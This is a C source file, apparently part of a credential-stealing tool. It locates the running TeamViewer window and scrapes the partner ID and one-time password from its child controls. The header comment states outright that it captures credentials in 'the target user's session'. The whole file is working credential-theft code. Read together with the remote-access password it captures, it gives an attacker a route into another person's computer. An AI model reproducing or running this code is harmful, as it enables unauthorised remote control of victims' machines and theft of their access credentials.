/*
 * TeamViewer credential capture from the running GUI.
 *
 * The main window ("TeamViewer") hosts child controls: the ID is in an
 * "Edit"-class control (read with WM_GETTEXT) and the one-time password in
 * "Static"-class controls (read with GetWindowText). Requires an interactive
 * desktop — run in the target user's session.
 */
#include "teamviewer.h"
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <windows.h>

typedef struct {
    char** texts;
    int count;
    int max;
} TvTexts;

static BOOL CALLBACK tv_enum_child(HWND hwnd, LPARAM lParam) {
    TvTexts* t = (TvTexts*)lParam;
    char cls[64] = {0};
    char text[512] = {0};

    if (!GetClassNameA(hwnd, cls, sizeof(cls))) return TRUE;
    if (_stricmp(cls, "Edit") == 0)
        SendMessageA(hwnd, WM_GETTEXT, sizeof(text), (LPARAM)text);
    else if (_stricmp(cls, "Static") == 0)
        GetWindowTextA(hwnd, text, sizeof(text));
    else
        return TRUE;

    if (text[0] && t->count < t->max) {
        t->texts[t->count] = _strdup(text);
        if (t->texts[t->count]) t->count++;
    }
    return TRUE;
}

const char* teamviewer_scan(void) {
    static char result[16384];
    int rp = 0;
    HWND main_wnd;
    TvTexts t;
    int i;
    int lines = 0;

    result[0] = 0;
    main_wnd = FindWindowA(NULL, "TeamViewer");
    if (!main_wnd) {
        /* newer builds use localized/classed windows; try the class too */
        main_wnd = FindWindowA("#32770", NULL);
        while (main_wnd) {
            char title[256] = {0};
            GetWindowTextA(main_wnd, title, sizeof(title));
            if (strstr(title, "TeamViewer")) break;
            main_wnd = GetWindow(main_wnd, GW_HWNDNEXT);
        }
    }
    if (!main_wnd) {
        snprintf(result, sizeof(result),
                 "TeamViewer main window not found (not running, minimized to tray, or modified build).\n");
        return result;
    }

    t.texts = (char**)calloc(256, sizeof(char*));
    t.count = 0;
    t.max = 256;
    if (!t.texts) return result;

    EnumChildWindows(main_wnd, tv_enum_child, (LPARAM)&t);

    rp += snprintf(result + rp, sizeof(result) - rp,
                   "TeamViewer window texts (%d controls):\n", t.count);
    for (i = 0; i < t.count; i++) {
        /* keep the output readable: ID/password lines are short */
        if (strlen(t.texts[i]) <= 128) {
            rp += snprintf(result + rp, sizeof(result) - rp, "  %s\n", t.texts[i]);
            lines++;
        }
        free(t.texts[i]);
    }
    free(t.texts);
    if (!lines)
        rp += snprintf(result + rp, sizeof(result) - rp, "  (no control text captured)\n");
    return result;
}
